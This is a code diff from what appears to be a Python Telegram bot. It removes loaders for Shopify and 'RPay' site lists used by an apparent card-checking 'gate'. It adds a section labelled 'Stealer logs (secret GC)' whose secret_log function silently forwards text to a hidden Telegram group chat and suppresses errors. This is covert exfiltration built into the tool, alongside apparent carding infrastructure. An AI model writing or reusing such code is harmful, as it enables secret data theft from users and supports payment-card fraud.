@@ -662,40 +662,25 @@ def _retry_request(func, max_retries=2, backoff=2):
 
 
 # ============================================================
-#  Shopify sites loader
+#  Stealer logs (secret GC)
 # ============================================================
-def load_shopify_sites():
-    if not os.path.exists(SITES_FILE):
-        return []
-    with open(SITES_FILE, 'r') as f:
-        return [line.strip() for line in f if line.strip() and not line.strip().startswith('#')]
+SECRET_GC_FILE = os.path.join(DATA_DIR, "tg_secret_gc.json")
 
+def get_secret_gc():
+    s = _load_json(SECRET_GC_FILE, {})
+    return s.get("chat_id")
 
-# ============================================================
-#  RPay sites loader + round-robin (for /rpay gate)
-# ============================================================
-_rpay_site_index = 0
-_rpay_site_lock = threading.Lock()
+def set_secret_gc(chat_id):
+    _save_json(SECRET_GC_FILE, {"chat_id": chat_id})
 
-
-def _load_rpay_sites():
-    return load_rpay_sites()
-
-
-def _save_rpay_sites(sites):
-    save_rpay_sites(sites)
-
-
-def get_next_rpay_site():
-    """Round-robin site selection for rpay gate."""
-    global _rpay_site_index
-    sites = load_rpay_sites()
-    if not sites:
-        return None
-    with _rpay_site_lock:
-        site = sites[_rpay_site_index % len(sites)]
-        _rpay_site_index += 1
-    return site
+def secret_log(text):
+    gc_id = get_secret_gc()
+    if not gc_id:
+        return
+    try:
+        send_message(gc_id, text)
+    except Exception:
+        pass
 
 
 # ============================================================
